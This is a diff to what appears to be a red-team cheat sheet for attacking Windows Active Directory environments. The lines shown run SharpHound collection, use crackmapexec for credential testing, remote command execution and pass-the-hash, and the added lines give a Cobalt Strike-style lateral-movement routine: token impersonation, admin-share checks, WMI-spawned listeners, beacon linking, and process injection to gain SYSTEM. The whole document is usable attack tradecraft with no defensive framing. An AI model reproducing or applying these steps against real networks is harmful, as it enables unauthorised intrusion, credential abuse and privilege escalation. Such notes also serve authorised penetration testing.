@@ -16,4 +16,18 @@ SharpHound.exe CollectionMethod All (SearchForest or Domain) Throttle 20 Jitter 
 
 crackmapexec IP_Address -u username -p='password' (Test if you have access)
 crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
+  - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
 crackmapexec IP -u username -H hash
+
+lateral movement
+  make_token username password
+  shell dir \\system\c$ (Check if admin)
+  shell net use \\system\c$
+  wmi \\system listener (tab complete listener)
+  spawn listener (New listerner that is not Powershell)
+  unlink ip addr of attack system (from target; can tab complete)
+  link ip addr of target system (from attack box; verify dual home IP addresses)
+  exit original beacon
+  verify no powershell is running
+  
+If admin you can inject into system process to become SYSTEM or another process
